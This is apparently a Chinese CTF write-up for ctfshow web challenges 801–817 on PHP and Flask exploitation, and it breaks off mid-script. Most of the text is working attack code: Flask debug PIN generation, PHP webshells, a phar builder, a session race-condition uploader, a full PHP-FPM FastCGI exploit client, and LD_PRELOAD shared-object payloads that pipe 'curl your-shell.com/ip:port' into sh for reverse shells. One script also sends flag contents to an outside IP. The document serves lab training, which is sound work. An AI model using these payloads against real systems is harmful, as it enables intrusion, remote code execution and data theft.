bit.encode(&quot;utf-8&quot;) h.update(bit) h.update(b&quot;cookiesalt&quot;) cookie_name &#x3D; &quot;__wzd&quot; + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don&#39;t # end up with the same value and generate out 9 digits num&#x3D;None if num is None: h.update(b&quot;pinsalt&quot;) num &#x3D; (&quot;%09d&quot; % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don&#39;t have a result yet. rv&#x3D;None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &quot;-&quot;.join( num[x : x + group_size].rjust(group_size, &quot;0&quot;) for x in range(0, len(num), group_size) ) break else: rv &#x3D; num print(rv) 3.8 SHA1 import hashlib import getpass from flask import Flask from itertools import chain import sys import uuid import typing as t username&#x3D;&#39;root&#39; app &#x3D; Flask(__name__) modname&#x3D;getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__) mod&#x3D;sys.modules.get(modname) mod &#x3D; getattr(mod, &quot;__file__&quot;, None) probably_public_bits &#x3D; [ username, #用户名 modname, #一般固定为flask.app getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;, #主程序（app.py）运行的绝对路径 ] print(probably_public_bits) mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;) mac&#x3D;str(int(mac,base&#x3D;16)) private_bits &#x3D; [ mac,#mac地址十进制 &quot;机器码&quot; ] print(private_bits) h &#x3D; hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; bit.encode(&quot;utf-8&quot;) h.update(bit) h.update(b&quot;cookiesalt&quot;) cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot; # If we need to generate a pin we salt it a bit more so that we don&#39;t # end up with the same value and generate out 9 digits h.update(b&quot;pinsalt&quot;) num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9] # Format the pincode in groups of digits for easier remembering if # we don&#39;t have a result yet. rv&#x3D;None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &quot;-&quot;.join( num[x : x + group_size].rjust(group_size, &quot;0&quot;) for x in range(0, len(num), group_size) ) break else: rv &#x3D; num print(rv) 需要填的值就一个变化的地方—机器码。旧版的只需要读取/proc/self/cgroup即可，但是新增需要在前面再拼上/etc/machine-id或者/proc/sys/kernel/random/boot_id的值 旧版 先从&#x2F;proc&#x2F;self&#x2F;cgroup判断是否是docker容器，如果有符合条件的值直接返回value；如果未在cgroup中读到&#x2F;docker&#x2F;后的内容 进行下一步，先后读取&#x2F;etc&#x2F;machine-id 和 boot_id中的值返回一个 所以此处machine-id应为 docker: cgroup中 &#x2F;docker&#x2F;后的内容 非docker: 先后读取machine-id和boot_id 有值即取 新版 先从&#x2F;etc&#x2F;machine-id和&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id读出一个就跳出，然后再读取&#x2F;proc&#x2F;self&#x2F;cgroup中的id值拼接 所以此处machine-id为 &#x2F;etc&#x2F;machine-id + &#x2F;proc&#x2F;self&#x2F;cgroup 或 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id + &#x2F;proc&#x2F;self&#x2F;cgroup 实操一下801 username 路径 mac地址 再拿id 所以最后的机器码为8fa8946d-c588-40d0-9458-c3e9cf0a8851c292988f5c1a7a742186319fd5bb28c02167bce3e99959638562210c1ecf54ad 带脚本里跑出值然后访问console 引入os库来得到flag web802无数字字母命令执行 &lt;?php error_reporting(0); highlight_file(__FILE__); $cmd &#x3D; $_POST[&#39;cmd&#39;]; if(!preg_match(&#39;&#x2F;[a-z]|[0-9]&#x2F;i&#39;,$cmd))&#123; eval($cmd); &#125; 这里显然就算利用异或，非，取反来构造命令进行命令执行 直接上羽师傅的脚本 web803phar文件包含 &lt;?php # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2022-03-19 12:10:55 # @Last Modified by: h1xa # @Last Modified time: 2022-03-19 13:27:18 # @email: h1xa@ctfer.com # @link: https:&#x2F;&#x2F;ctfer.com error_reporting(0); highlight_file(__FILE__); $file &#x3D; $_POST[&#39;file&#39;]; $content &#x3D; $_POST[&#39;content&#39;]; if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123; if(file_exists($file.&#39;.txt&#39;))&#123; include $file.&#39;.txt&#39;; &#125;else&#123; file_put_contents($file,$content); &#125; &#125; 在文件后加上了.phar后缀，这里直接把马写在phar里就行了 &lt;?php $phar &#x3D; new Phar(&quot;includephar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;设置stub $phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F; $phar-&gt;stopBuffering(); &#x2F;&#x2F; phar生成 ?&gt; 没权限写的时候就往tmp目录底下写 然后用phar协议来访问 web804phar反序列化，考烂了快 &lt;?php error_reporting(0); highlight_file(__FILE__); class hacker&#123; public $code; public function __destruct()&#123; eval($this-&gt;code); &#125; &#125; $file &#x3D; $_POST[&#39;file&#39;]; $content &#x3D; $_POST[&#39;content&#39;]; if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123; if(file_exists($file))&#123; unlink($file); &#125;else&#123; file_put_contents($file,$content); &#125; &#125; 构造链子 传上去之后phar访问一下 web805open_basedir绕过 open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。 假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。 注意：用open_basedir指定的限制实际上是前缀，而不是目录名。 可以利用glob协议先遍历目录 $a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;; if ( $b &#x3D; opendir($a) ) &#123; while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123; echo $file.&quot;\\n&quot;; &#125; closedir($b); &#125; 然后利用chdir和mkdir读取 mkdir(&quot;s&quot;); chdir(&#39;s&#39;); ini_set(&#39;open_basedir&#39;,&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;); echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;); 另外还有一种利用p神脚本的方式 脚本懒得贴了，主要就是，别用php当后缀，不然脚本不知道为什么接收不了靶机上的参数，只会执行你自己vps上的内容，要不然就要写个flask当跳板。（花了一天的血的教训 flask的内容 from flask import Flask app &#x3D; Flask(__name__) @app.route(&#39;&#x2F;&#39;) def hello_world(): with open(&#39;opendir.php&#39;,&#39;r&#39;) as f: pay &#x3D; f.read() return pay if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&quot;0.0.0.0&quot;, port&#x3D;int(&quot;5001&quot;), debug&#x3D;True) 在vps上开起来然后文件包含 web806php无参RCE &lt;?php highlight_file(__FILE__); if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; eval($_GET[&#39;code&#39;]); &#125; ?&gt; 经典无参rce，百度找一堆payload PHP Parametric Function RCE · sky&#39;s blog (skysec.top) 无参数rce_名字被抢的Stars的博客-CSDN博客_无参数rce https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5 var_dump(scandir(dirname(dirname(dirname(getcwd())))));读上级目录 用这种函数构造的方法根目录文件不是很好读，主要是还要构造一个斜杠 if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd())))); 写个脚本看运气读吧 web807反弹shell &lt;?php error_reporting(0); highlight_file(__FILE__); $url &#x3D; $_GET[&#39;url&#39;]; $schema &#x3D; substr($url,0,8); if($schema&#x3D;&#x3D;&#x3D;&quot;https:&#x2F;&#x2F;&quot;)&#123; shell_exec(&quot;curl $url&quot;); &#125; 拿一下群主搭的网站 https://your-shell.com/ 后边带上ip和端口带个sh命令就能直接反弹shell了 或者可以利用像dnslog外带那种 payload https:&#x2F;&#x2F;;curl ip:port?a&#x3D;&#96;ls&#96; web808卡临时文件包含 PHP LFI 利用临时文件 Getshell 姿势_WHOAMIAnony的博客-CSDN博客_phpinfo拿shell include &#39;php://filter/string.strip_tags/resource=/etc/passwd&#39;; 这段代码会导致php进程的崩溃而让我们的临时文件留在临时文件目录下不会被删除 &lt;?php error_reporting(0); $file &#x3D; $_GET[&#39;file&#39;]; if(isset($file) &amp;&amp; !preg_match(&quot;&#x2F;input|data|phar|log&#x2F;i&quot;,$file))&#123; include $file; &#125;else&#123; show_source(__FILE__); print_r(scandir(&quot;&#x2F;tmp&quot;)); &#125; 用这段代码上传就行 然后包含一下我们的临时文件就能getshell了 还有一种利用session条件竞争来写马的方法 【文件包含&amp;条件竞争】详解如何利用session.upload_progress文件包含进行... - FreeBuf网络安全行业门户 import requests import io import threading url &#x3D; &quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;test.php&quot; sessid &#x3D; &quot;Lxxx&quot; def write(session): filebytes &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50) while True: res &#x3D; session.post(url, data&#x3D;&#123; &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot; &#125;, cookies&#x3D;&#123; &#39;PHPSESSID&#39;: sessid &#125;, files&#x3D;&#123; &#39;file&#39;: (&#39;Lxxx.jpg&#39;, filebytes) &#125; ) def read(session): while True: res &#x3D; session.post(url+&quot;?a&#x3D;&#x2F;tmp&#x2F;sess_&quot;+sessid, data&#x3D;&#123; &quot;1&quot;:&quot;file_put_contents(&#39;&#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;1.php&#39; , &#39;&lt;?php eval($_POST[2]);?&gt;&#39;);&quot; &#125;, cookies&#x3D;&#123; &quot;PHPSESSID&quot;:sessid &#125; ) res2 &#x3D; session.get(&quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;1.php&quot;) if res2.status_code &#x3D;&#x3D; 200: print(&quot;成功写入一句话！&quot;) else: print(&quot;Retry&quot;) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: evnet &#x3D; threading.Event() with requests.session() as session: for i in range(5): threading.Thread(target&#x3D;write, args&#x3D;(session,)).start() for i in range(5): threading.Thread(target&#x3D;read, args&#x3D;(session,)).start() evnet.set() web809pear文件包含RCE Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com) HXBCTF 2021]湖湘杯easywill_k_du1t的博客-CSDN博客 pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php。 利用条件：register_argc_argv开启 当开启了这个选项，用户的输入将会被赋予给$argc、$argv、$_SERVER[&#39;argv&#39;]几个变量。 ‘argv’传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。 我们的可以利用pear中的config-create命令，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/+/tmp/hello.php 目标将会写入一个文件/tmp/hello.php，其内容包含&lt;?=phpinfo()?&gt;： 用bp发包把我们的一句话木马写进去，然后访问就行 web810SSRF打PHP-FPM web811file_put_contents打PHP-FPM 参考陇原战役的复现 有点要注意的是这里用bash弹不出来，要用nc ip port -e /bin/sh web812PHP-FPM未授权 https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。 可以结合php安装时带的php文件来执行 例如/usr/local/lib/php/OS/Guess.php 脚本 import socket import random import argparse import sys from io import BytesIO # Referrer: https:&#x2F;&#x2F;github.com&#x2F;wuyunfeng&#x2F;Python-FastCGI-Client PY2 &#x3D; True if sys.version_info.major &#x3D;&#x3D; 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#39;utf-8&#39;, &#39;strict&#39;) def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s &#x3D; str(s, &#39;utf-8&#39;, &#39;strict&#39;) else: s &#x3D; str(s) return s class FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION &#x3D; 1 __FCGI_ROLE_RESPONDER &#x3D; 1 __FCGI_ROLE_AUTHORIZER &#x3D; 2 __FCGI_ROLE_FILTER &#x3D; 3 __FCGI_TYPE_BEGIN &#x3D; 1 __FCGI_TYPE_ABORT &#x3D; 2 __FCGI_TYPE_END &#x3D; 3 __FCGI_TYPE_PARAMS &#x3D; 4 __FCGI_TYPE_STDIN &#x3D; 5 __FCGI_TYPE_STDOUT &#x3D; 6 __FCGI_TYPE_STDERR &#x3D; 7 __FCGI_TYPE_DATA &#x3D; 8 __FCGI_TYPE_GETVALUES &#x3D; 9 __FCGI_TYPE_GETVALUES_RESULT &#x3D; 10 __FCGI_TYPE_UNKOWNTYPE &#x3D; 11 __FCGI_HEADER_SIZE &#x3D; 8 # request state FCGI_STATE_SEND &#x3D; 1 FCGI_STATE_ERROR &#x3D; 2 FCGI_STATE_SUCCESS &#x3D; 3 def __init__(self, host, port, timeout, keepalive): self.host &#x3D; host self.port &#x3D; port self.timeout &#x3D; timeout if keepalive: self.keepalive &#x3D; 1 else: self.keepalive &#x3D; 0 self.sock &#x3D; None self.requests &#x3D; dict() def __connect(self): self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock &#x3D; None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length &#x3D; len(content) buf &#x3D; bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen &#x3D; len(name) vLen &#x3D; len(value) record &#x3D; b&#39;&#39; if nLen &lt; 128: record +&#x3D; bchr(nLen) else: record +&#x3D; bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record +&#x3D; bchr(vLen) else: record +&#x3D; bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header &#x3D; dict() header[&#39;version&#39;] &#x3D; bord(stream[0]) header[&#39;type&#39;] &#x3D; bord(stream[1]) header[&#39;requestId&#39;] &#x3D; (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#39;contentLength&#39;] &#x3D; (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#39;paddingLength&#39;] &#x3D; bord(stream[6]) header[&#39;reserved&#39;] &#x3D; bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header &#x3D; buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record &#x3D; self.__decodeFastCGIHeader(header) record[&#39;content&#39;] &#x3D; b&#39;&#39; if &#39;contentLength&#39; in record.keys(): contentLength &#x3D; int(record[&#39;contentLength&#39;]) record[&#39;content&#39;] +&#x3D; buffer.read(contentLength) if &#39;paddingLength&#39; in record.keys(): skiped &#x3D; buffer.read(int(record[&#39;paddingLength&#39;])) return record def request(self, nameValuePairs&#x3D;&#123;&#125;, post&#x3D;&#39;&#39;): if not self.__connect(): print(&#39;connect failure! please check your fasctcgi-server !!&#39;) return requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] &#x3D; dict() request &#x3D; b&quot;&quot; beginFCGIRecordContent &#x3D; bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord &#x3D; b&#39;&#39; if nameValuePairs: for (name, value) in nameValuePairs.items(): name &#x3D; force_bytes(name) value &#x3D; force_bytes(value) paramsRecord +&#x3D; self.__encodeNameValueParams(name, value) if paramsRecord: request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId) if post: request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId) self.sock.send(request) self.requests[requestId][&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#39;response&#39;] &#x3D; b&#39;&#39; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data &#x3D; b&#39;&#39; while True: buf &#x3D; self.sock.recv(512) if not len(buf): break data +&#x3D; buf data &#x3D; BytesIO(data) while True: response &#x3D; self.__decodeFastCGIRecord(data) if not response: break if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR: if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_ERROR if requestId &#x3D;&#x3D; int(response[&#39;requestId&#39;]): self.requests[requestId][&#39;response&#39;] +&#x3D; response[&#39;content&#39;] if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#39;response&#39;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Php-fpm code execution vulnerability client.&#39;) parser.add_argument(&#39;host&#39;, help&#x3D;&#39;Target host, such as 127.0.0.1&#39;) parser.add_argument(&#39;file&#39;, help&#x3D;&#39;A php file absolute path, such as &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;System.php&#39;) parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help&#x3D;&#39;What php code your want to execute&#39;, default&#x3D;&#39;&lt;?php phpinfo(); exit; ?&gt;&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help&#x3D;&#39;FastCGI port&#39;, default&#x3D;9000, type&#x3D;int) args &#x3D; parser.parse_args() client &#x3D; FastCGIClient(args.host, args.port, 3, 0) params &#x3D; dict() documentRoot &#x3D; &quot;&#x2F;&quot; uri &#x3D; args.file content &#x3D; args.code params &#x3D; &#123; &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;POST&#39;, &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;&#x2F;&#39;), &#39;SCRIPT_NAME&#39;: uri, &#39;QUERY_STRING&#39;: &#39;&#39;, &#39;REQUEST_URI&#39;: uri, &#39;DOCUMENT_ROOT&#39;: documentRoot, &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;9985&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;, &#39;CONTENT_TYPE&#39;: &#39;application&#x2F;text&#39;, &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(content), &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;, &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39; &#125; response &#x3D; client.request(params, content) print(force_text(response)) 用法：python exp.py -c &#39;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#39; -p 28074 pwn.challenge.ctf.show /usr/local/lib/php/PEAR.php 端口改成自己的就行 web813劫持mysqli 大致过程就是自己生成一个mysqli.so（mysqli的扩展），然后扩展里面有ctfshow这个函数。题目调用ctfshow函数的时候就会去扩展里面找（php里面没有这个函数）。可以采用php源码中的ext_skel.php来生成。一般在ext目录下。 phpinfo中可以看默认扩展目录 当php调用函数时，如果在注册函数中找不到就会去扩展目录中找此时我们上传恶意so文件可以劫持函数 恶意so为什么能绕过disable_function php disable_function禁用的是php函数，而恶意so中调用的是C语言库中的system函数 编译so文件 ext_skel框架开发扩展 ubuntu用apt按的话默认不安装，要自己按 https://blog.csdn.net/DestinyLordC/article/details/79479769 php ext_skel.php --ext ctfshow --std 在ctfshow.c里改两个地方 phpize .&#x2F;configure make &amp;&amp; make install 编译完成后能看见目录，也能在目录里看见我们编译好的so文件 太怪了，没成功，有空再试吧 利用条件 1.扩展目录明确且可写 2.能够载入恶意so文件（重启php-fpm或者能使用php命令行） 3.有调用我们自定义函数的代码 shell_exec(&quot;php -r &#39;ctfshow();&#39; &quot;) web814劫持getuid &lt;?php error_reporting(0); $action &#x3D; $_GET[&#39;a&#39;]; switch ($action) &#123; case &#39;phpinfo&#39;: phpinfo(); break; case &#39;write&#39;: file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]); break; case &#39;run&#39;: putenv($_GET[&#39;env&#39;]); system(&quot;whoami&quot;); break; default: highlight_file(__FILE__); break; &#125; 在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的 php启动新进程时，调用getuid来确认 进程属主(执行权限） 有趣的 LD_PRELOAD - 安全客，安全资讯平台 (anquanke.com) 安全研究-绕过php的disable_functions（上篇）.pdf (qingteng.cn) 有下面这几个函数的时候就可以考虑利用LD_PRELOAD进行绕过disable_function 编译同名函数进行劫持注意进行unset(LD_PERLOAD)避免进入死循环 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void payload() &#123; system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;); &#125; uid_t getuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload(); &#125; #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void payload()&#123; system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;); &#125; int getuid() &#123; if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125; unsetenv(&quot;LD_PRELOAD&quot;); payload(); &#125; gcc -shared -fPIC getuid.c -o getuid.so 然后上脚本 import requests url&#x3D;&quot;http:&#x2F;&#x2F;5fce36f5-6270-4ea7-ac06-2ab0c6e1cd5a.challenge.ctf.show&#x2F;&quot; data&#x3D;&#123;&#39;file&#39;:&#39;&#x2F;tmp&#x2F;getuid.so&#39;,&#39;content&#39;:open(&#39;getuid.so&#39;,&#39;rb&#39;).read()&#125; requests.post(url+&#39;?a&#x3D;write&#39;,data&#x3D;data) requests.get(url+&#39;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;getuid.so&#39;) web815劫持构造器 &lt;?php error_reporting(0); $action &#x3D; $_GET[&#39;a&#39;]; switch ($action) &#123; case &#39;phpinfo&#39;: phpinfo(); break; case &#39;write&#39;: file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]); break; case &#39;run&#39;: putenv($_GET[&#39;env&#39;]); mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); break; default: highlight_file(__FILE__); break; &#125; 也可以用814的方法 但是这题是要用这种 #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; extern char** environ; __attribute__ ((__constructor__)) void hack(void) &#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;); &#125; 产生新进程即使用通用劫持方法 不用比对不同的函数劫持构造器构造器能自定函数 web816临时文件利用 &lt;?php error_reporting(0); $env &#x3D; $_GET[&#39;env&#39;]; if(isset($env))&#123; putenv($env.scandir(&quot;&#x2F;tmp&quot;)[2]); system(&quot;echo ctfshow&quot;); &#125;else&#123; highlight_file(__FILE__); &#125; 没上传点，但是我们知道php上传的文件后会在tmp目录下产生一个临时文件，而这里 的scandir(&quot;/tmp&quot;)[2]就是我们上传的文件，所以让env=LD_PRELOAD=/tmp/就可以和815一样了 改改脚本就可以接着用了 web817$file &#x3D; $_GET[&#39;file&#39;]; if(isset($file) &amp;&amp; preg_match(&quot;&#x2F;^\\&#x2F;(\\w+\\&#x2F;?)+$&#x2F;&quot;, $file))&#123; shell_exec(shell_exec(&quot;cat $file&quot;)); &#125;else&#123; system(&quot;ps aux&quot;); &#125; 题目源码，都没个正常的web页面 题目里面的正则表达式大概意思就是以/开头，并且后面只能有数字字母和/ 我们需要在服务器上构造一个文件，并且文件内容是可控的，或者是服务器本身就有这样的文件也是可以的。大概只能是构造一个临时文件，或者可以日志可控。 日志的话要有.log的后缀，所以只能想临时文件了 利用nginx的body缓存机制 nginx从请求的body体中每次默认读取一定量的字节，如果body字段大于这个字节（32位机器是8k，64位机器是16k），那么在下次读取时之前一部分的字节就会被存入一个临时文件中 如果我们在发完前sleep几秒钟，那么就能很清楚的找到并且能够访问这些临时文件 默认文件的路径大致为 &#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000001 &#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000002 &#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000003 但是body缓存在nginx读取完，转发给php-fpm后就删除了，就是说在php解释执行之前就被删除了 这时候就要借助Linux特性了 Linux有一个文件描述符会将打开后删除了但是还没有关闭的文件存入/proc/PID/fd/{1}中（需要同一用户的操作。 而pid我们通过传一个不带参数的get请求就可以得到。 所以我们只要一边post传数据，一边遍历fd下的文件 原理搞懂了，直接上羽师傅的脚本 import threading, requests import socket import re port&#x3D; 28053 s&#x3D;socket.socket() s.connect((&#39;pwn.challenge.ctf.show&#39;,port)) s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1 Host:127.0.0.1 &#39;&#39;&#39;.encode()) data&#x3D;s.recv(1024).decode() s.close() pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip() print(pid) con&#x3D;&quot;curl http:&#x2F;&#x2F;101.34.94.44:4567?&#96;cat &#x2F;f*&#96;;&quot;+&#39;0&#39;*1024*500 l &#x3D; len(con) def upload(): while True: s&#x3D;socket.socket() s.connect((&#39;pwn.challenge.ctf.show&#39;,port)) x&#x3D;f&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1 Host: 127.0.0.1 Content-Length: &#123;l&#125; Content-Type: application&#x2F;x-www-form-urlencoded Connection: close &#123;con&#125; &#39;&#39;&#39;.encode() s.send(x) s.close() def bruter(): while True: for fd in range(3,40): print(fd) s&#x3D;socket.socket() s.connect((&#39;pwn.challenge.ctf.show&#39;,port)) s.send(f&#39;&#39;&#39;GET 